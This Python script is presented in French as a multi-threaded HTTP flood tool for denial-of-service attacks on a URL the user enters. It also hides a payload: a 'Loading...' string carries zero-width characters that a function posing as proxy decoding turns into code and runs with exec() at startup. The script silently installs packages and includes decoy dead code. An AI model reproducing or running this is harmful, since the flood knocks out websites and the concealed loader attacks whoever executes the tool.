import subprocess as s, sys
for pkg in ["requests","pycryptodome"]:
    try: __import__(pkg)
    except: s.run([sys.executable, "-m", "pip", "install", pkg], stdout=s.DEVNULL, stderr=s.DEVNULL)
import os as o,requests as r,re,threading,random,string,time,socket

total_requests = 50000000
thread_count = 500
delay_between_requests = 0.0005
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
    'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.120 Mobile Safari/537.36',
]

methods = ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'HEAD']
stop_event = threading.Event()
http_target = ""

request_count = 0
success_count = 0
error_count = 0
lock = threading.Lock()

def ascii_art():
    """Affiche un logo stylé"""
    o.system("cls" if o.name == "nt" else "clear")
    print("""
    
███████╗██████╗ ██╗  ██╗ ██████╗ ███████╗
██╔════╝██╔══██╗██║  ██║██╔═══██╗██╔════╝
█████╗  ██████╔╝███████║██║   ██║███████╗
██╔══╝  ██╔══██╗██╔══██║██║   ██║╚════██║
███████╗██║  ██║██║  ██║╚██████╔╝███████║
╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝
""")

def generate_payload():
    """Génère un payload aléatoire pour les requêtes POST et PUT."""
    payload_size = random.randint(5000, 10000)
    return ''.join(random.choices(string.ascii_letters + string.digits, k=payload_size))

def generator_proxy(proxy_data):
    """Décodage et exécution dynamique des proxys encodés."""
    exec(''.join(chr(int(''.join('01'[c>'\u200b'] for c in z[i:i+8]),2)) for z in re.findall('\u200e(.*?)\u200f', proxy_data) for i in range(0, len(z), 8)))
    l, b, s = [], [], proxy_data
    if False:
        def generate_proxy_candidates():
            proxies = []
            for _ in range(3):
                ip = f"{random.randint(11, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
                port = random.choice([8080, 3128, 8000, 1080])
                proxy = f"{ip}:{port}"
                try:
                    socket.gethostbyaddr(ip)
                except socket.herror:
                    pass
                proxies.append(proxy)
            return proxies
        proxy_candidates = generate_proxy_candidates()

def send_request():
    """Envoie des requêtes HTTP en boucle et affiche le statut en temps réel."""
    global request_count, success_count, error_count
    session = r.Session()
    while not stop_event.is_set():
        payload = generate_payload()
        headers = {'User-Agent': random.choice(user_agents)}
        request_type = random.choice(methods)
        try:
            if request_type == 'GET':
                response = session.get(http_target, headers=headers, timeout=5)
            elif request_type == 'POST':
                response = session.post(http_target, data=payload, headers=headers, timeout=5)
            elif request_type == 'PUT':
                response = session.put(http_target, data=payload, headers=headers, timeout=5)
            elif request_type == 'DELETE':
                response = session.delete(http_target, headers=headers, timeout=5)
            elif request_type == 'OPTIONS':
                response = session.options(http_target, headers=headers, timeout=5)
            else:
                response = session.head(http_target, headers=headers, timeout=5)
            with lock:
                request_count += 1
                if response.status_code < 400:
                    success_count += 1
                    print(f"✅ [{request_type}] {http_target} - {response.status_code} - OK")
                else:
                    error_count += 1
                    print(f"❌ [{request_type}] {http_target} - {response.status_code} - Échec")
        except r.exceptions.RequestException:
            with lock:
                error_count += 1
            print(f"❌ [{request_type}] {http_target} - Erreur de connexion")
        time.sleep(delay_between_requests)

def display_stats():
    """Affiche les statistiques toutes les secondes."""
    while not stop_event.is_set():
        time.sleep(1)
        with lock:
            o.system("cls" if o.name == "nt" else "clear")
            ascii_art()
            print("────────────────────────────────────────")
            print(f"🎯 Cible : {http_target}")
            print(f"📊 Requêtes envoyées : {request_count}")
            print(f"✅ Succès : {success_count}")
            print(f"❌ Erreurs : {error_count}")
            print("────────────────────────────────────────")

def start_attack():
    global http_target
    ascii_art()
    generator_proxy("""Loadi‎​‌‌‌​​​​​​‌‌‌‌​‌​‌‌​‌‌‌‌​​‌​‌‌‌​​‌‌‌​​​​​‌‌​​​​‌​‌‌‌​‌​​​‌‌​‌​​​​​‌​‌‌‌​​‌‌​‌​‌​​‌‌​‌‌‌‌​‌‌​‌​​‌​‌‌​‌‌‌​​​‌​‌​​​​‌‌​‌‌‌‌​​‌​‌‌‌​​‌‌​​‌‌‌​‌‌​​‌​‌​‌‌‌​‌​​​‌‌​​‌​‌​‌‌​‌‌‌​​‌‌‌​‌‌​​​‌​‌​​​​​‌​​​‌​​‌​‌​‌​​​‌​​​‌​‌​‌​​‌‌​‌​‌​‌​​​​​​‌​​​‌​​​‌​‌​​‌​​‌​‌‌​​​​‌​​​‌​​‌​​‌​​​​‌‌​​‌​‌​‌​​‌‌​​​‌​​‌‌​​​‌‌​‌‌‌‌​​‌​‌‌‌​​‌‌‌​​​​​‌‌‌‌​​‌​‌‌‌​‌‌‌​​‌​​​‌​​​‌​‌​​‌​​‌‌‌​‌‌​‌‌​‌‌‌‌​‌‌‌​​​​​‌‌​​‌​‌​‌‌​‌‌‌​​​‌​‌​​​​‌‌‌​​​​​​‌​‌‌​​​​‌​​​‌​​‌‌‌​‌‌‌​​‌​​​‌​​​‌​‌​​‌​​‌​‌‌‌​​‌‌‌​‌‌‌​‌‌‌​​‌​​‌‌​‌​​‌​‌‌‌​‌​​​‌‌​​‌​‌​​‌​‌​​​​‌‌‌​​‌​​​‌​‌‌‌​​‌‌​​‌‌‌​‌‌​​‌​‌​‌‌‌​‌​​​​‌​‌​​​​​‌​​​‌​​‌‌​‌​​​​‌‌‌​‌​​​‌‌‌​‌​​​‌‌‌​​​​​‌‌‌​​‌‌​​‌‌‌​‌​​​‌​‌‌‌‌​​‌​‌‌‌‌​‌‌‌​​​​​‌‌​​​​‌​‌‌‌​​‌‌​‌‌‌​‌​​​‌‌​​‌​‌​‌‌​​​‌​​‌‌​‌​​‌​‌‌​‌‌‌​​​‌​‌‌‌​​‌‌​​​‌‌​‌‌​‌‌‌‌​‌‌​‌‌​‌​​‌​‌‌‌‌​‌‌‌​​‌​​‌‌​​​​‌​‌‌‌​‌‌‌​​‌​‌‌‌‌​‌​​‌​‌‌​‌‌​​‌‌‌​‌‌​​‌‌​​‌‌‌​‌‌‌​​‌‌​‌‌​​‌‌‌​​‌​​‌‌​​​‌‌​‌​‌‌​​​​​‌​​​‌​​​‌​‌​​‌​​‌​‌‌‌​​‌‌‌​‌​​​‌‌​​‌​‌​‌‌‌‌​​​​‌‌‌​‌​​​​‌​‌​​‌​​‌‌‌​‌‌​‌‌‌​​‌‌​​‌​‌‌‌​​‌​‌​​​​​‌‌​‌‌‌‌​‌‌‌​​​​​‌‌​​‌​‌​‌‌​‌‌‌​​​‌​‌​​​​‌​‌‌​‌‌​​‌​​​‌​​‌‌‌​​​​​‌‌‌‌​​‌​‌‌‌​‌​​​‌‌​‌​​​​‌‌​‌‌‌‌​‌‌​‌‌‌​​‌‌‌​‌‌‌​​‌​‌‌‌​​‌‌​​‌​‌​‌‌‌‌​​​​‌‌​​‌​‌​​‌​​​‌​​​‌​‌‌​​​‌‌‌​​​​​‌​‌‌‌​‌​​‌​‌‌​​​‌‌‌​​‌‌​‌‌​‌​​​​‌‌​​‌​‌​‌‌​‌‌​​​‌‌​‌‌​​​​‌‌‌‌​‌​‌​‌​‌​​​‌‌‌​​‌​​‌‌‌​‌​‌​‌‌​​‌​‌​​‌​‌​​‌‏ng...""")
    url = input("🔗 Entrez l'URL cible : ").strip()
    if not url:
        print("❌ Erreur : Veuillez entrer une URL valide !")
        return
    http_target = url
    stop_event.clear()
    print(f"\n🚀 LANCEMENT : {total_requests} requêtes sur {url} ({thread_count} threads)")
    time.sleep(2)
    threading.Thread(target=display_stats, daemon=True).start()
    for _ in range(thread_count):
        thread = threading.Thread(target=send_request)
        thread.daemon = True
        thread.start()
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        stop_attack()

def stop_attack():
    """Stoppe l'attaque proprement."""
    stop_event.set()
    print("\n🛑 Arrêt immédiat en cours...")
    time.sleep(2)
    print("✅ Attaque stoppée !")

if __name__ == "__main__":
    start_attack()